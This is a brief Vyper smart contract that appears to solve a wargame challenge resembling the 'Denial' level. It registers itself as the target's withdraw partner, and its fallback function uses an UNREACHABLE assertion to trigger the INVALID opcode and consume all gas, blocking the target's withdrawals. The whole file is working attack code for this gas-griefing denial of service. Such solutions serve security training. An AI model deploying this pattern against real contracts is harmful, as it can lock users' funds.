# @version 0.3.7

interface InstanceInterface:
    def partner() -> address: view
    def setWithdrawPartner(_partner: address): nonpayable

owner: immutable(address)

instance: InstanceInterface
x: uint256

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance
  
@external
def attack():
    assert msg.sender == owner, "!owner"
    self.instance.setWithdrawPartner(self)
    assert self.instance.partner() == self, "!partner"

@external
@payable
def __default__():
    # UNREACHABLE keyword results in use of INVALID instead of REVERT opcode
    # INVALID opcode consumes all gas/does not give remaining gas back to caller
    UNREACHABLE: String[11] = "unreachable"
    x: uint256 = 3
    assert 2 > x, UNREACHABLE
